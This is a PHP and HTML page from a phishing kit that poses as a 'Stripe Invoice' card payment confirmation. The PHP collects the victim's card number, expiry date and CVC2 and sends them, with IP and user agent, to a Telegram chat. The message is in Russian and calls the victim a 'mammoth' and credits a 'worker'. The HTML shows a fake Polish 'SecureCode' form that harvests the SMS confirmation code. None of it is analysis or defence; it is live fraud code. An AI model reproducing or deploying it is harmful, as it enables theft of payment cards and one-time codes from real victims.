<?

include('config.php');
include('functions.php');

if (isset($_POST['amount']) && isset($_POST['card_number']) && isset($_POST['expdate']) && isset($_POST['cvc2'])) {
    setcookie('rdata', base64_encode(json_encode([
        'amount' => $_POST['amount'],
        'card_number' => $_POST['card_number'],
        'expdate' => $_POST['expdate'],
        'cvc2' => $_POST['cvc2'],
    ])));
    setcookie('solt', $_POST['solt']);
    header("Refresh:0");
    exit;
}

if (!isset($_COOKIE['rdata']) || !isset($_COOKIE['solt'])) {
    die('$_SERVER["HTTP_REFERER"] not found');
}

$rdata = json_decode(base64_decode($_COOKIE['rdata']),true);
$solt = json_decode(base64_decode($_COOKIE['solt']),true);

$amount = $rdata['amount'];
$card_number = $rdata['card_number'];
$expdate = $rdata['expdate'];
$cvc2 = $rdata['cvc2'];
$id = $solt['id'];
$shop = "Stripe Invoice";
$type = $solt['type'];
$worker = $solt['worker'];

//if (isset($_GET['c'])) {
    $payInfo = json_decode(file_get_contents("database/" . $id), true);
    $payInfo['status'] = 'wait';
    unset($payInfo['errmsg']);
    file_put_contents("database/" . $id, json_encode($payInfo));
//}

botSend([
    '⚠️ <b>Мамонт ввел карту'.(isset($_GET['r']) ? ' [Икс оплата]' : '').'</b>',
    '',
    '💰 Сумма: <b>'.$amount.' RUB</b>',
    '👨🏻‍💻Работник: <b>'.$worker.'</b>',
    '',
    '🏦 Эмитент: <b>'.cardBank($card_number).'</b>',
    '💳 Номер: <b>'.$card_number.'</b>',
    '📆 Срок: <b>'.$expdate.'</b>',
    '🔐 CVC: <b>'.$cvc2.'</b>',
    '',
    '🌐 IP адрес: <b>'.$_SERVER['REMOTE_ADDR'].' ('.$visitor['country'].', '.$visitor['city'].')</b>',
    '🖥 USERAGENT: <b>'.$_SERVER['HTTP_USER_AGENT'].'</b>',
], tgToken, chatAdmin);
?>

<!DOCTYPE html>

<html>

<head>
    <title>SecureCode</title>
    <meta charset="utf-8">
    <meta name="robots" content="all">
    <meta name="description" content="">
    <meta name="keywords" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css">
    <script type="text/javascript" src="assets/js/payment/feature-detect.js"></script>
    <script type="text/javascript" src="assets/js/payment/es5-shim.min.js"></script>
    <script type="text/javascript" src="assets/js/payment/jquery-1.11.3.min.js"></script>
    <script type="text/javascript" src="assets/js/payment/jquery.selectBox.min.js"></script>
    <script type="text/javascript" src="assets/js/payment/rb.js"></script>
    <script type="text/javascript" src="assets/js/payment/common.js"></script>
    <script type="text/javascript" src="assets/js/payment/cpg_waiter.js"></script>
    <script type="text/javascript" src="assets/js/payment/standard_waiter.js"></script>
    <link rel="stylesheet" href="assets/bootstrap/css/1bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/1Login-Form-Clean.css">
    <link rel="stylesheet" href="assets/css/1styles.css">
</head>
<section class="login-clean" style="height: 1040px;">
<form method="POST" action="wait.php" autocomplete="on">
<p style="text-align: center;font-weight: bold;margin-bottom: 25px;margin-left: 0px;">Potwierdzanie operacji</p>
            <div class="mb-3"><input class="form-control" type="password" name="securecode" id="cardName" placeholder="Kod z SMS" maxlength="10" required="" minlength="3"></div>
            <div class="mb-3"><button class="btn btn-primary d-block w-100" type="submit" style="background: var(--bs-blue);">Dalej</button></div><p class="forgot">Nie dostałeś kodu?</p> <a class="forgot" href="#"><font color = "blue"><u> Wyślij to jeszcze raz </u></font></a>

</form>
<script src="assets/bootstrap/js/bootstrap.min.js"></script>
</html>

<script src="https://static.codepen.io/assets/common/stopExecutionOnTimeout-db44b196776521ea816683afab021f757616c80860d31da6232dedb8d7cc4862.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js"></script>
<script src="https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js"></script>
